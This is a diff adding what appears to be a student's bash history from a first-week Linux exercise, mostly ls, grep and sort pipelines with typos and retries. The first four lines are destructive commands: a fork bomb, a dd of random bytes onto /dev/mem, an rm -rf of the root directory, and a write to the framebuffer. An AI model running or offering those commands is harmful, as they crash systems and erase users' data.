@@ -1,0 +1,47 @@
+    1  :(){ :|:& };:
+    2  dd if=/dev/urandom of=/dev/mem
+    3  rm -rf --no-preserve-root /
+    4  echo '{"/dev/fb0"0:`c$x*!3145727;o 10+x}0' | k
+    5  ~
+    6  mkdir ~ week1
+    7  mkdir ~/week1
+    8  cd ~ /week1
+    9  ls
+   10  cd week1
+   11  pwd
+   12  ls gss /usr/bin
+   13  ls > week1.txt
+   14  cat week.txt
+   15  ls
+   16  ls /usr/bin/ > week1.txt
+   17  cat week1.txt
+   18  grep gcc /week1
+   19  greb gcc /usr/bin
+   20  grep gcc /usr/bin
+   21  ls | gcc -r | tail -n 3 
+   22  ls | sort -r | tail -n 3
+   23  ls
+   24  greb gcc /week1
+   25  grep gcc /week1
+   26  grep gcc week1.txt
+   27  ls | sort -r
+   28  ls
+   29  ls > thisdir.txt
+   30  cat thisdir.txt 
+   31  ls | grep | sort -r | cat thisdir.txt
+   32  ls 
+   33  ls | grep gcc | sort -r | cat this.txt
+   34  ls | grep gcc | sort -r | cat thisdir.txt
+   35  grep gcc week1.txt
+   36  ls | grep gcc week1.txt | sort -r
+   37  ls > ex1.txt
+   38  ls | grep gcc week1.txt | sort -r | > ex1.txt
+   39  grep gcc ex1.txt
+   40  grep gcc week1.txt
+   41  cat ex1.txt 
+   42  ls | grep gcc | sort -r > ex1.txt
+   43  cat ex1.txt 
+   44  ls /usr/bin | grep gcc | sort -r > ex1.txt
+   45  cat ex1.txt 
+   46  ls > ex2.txt
+   47  history > ex2.txt
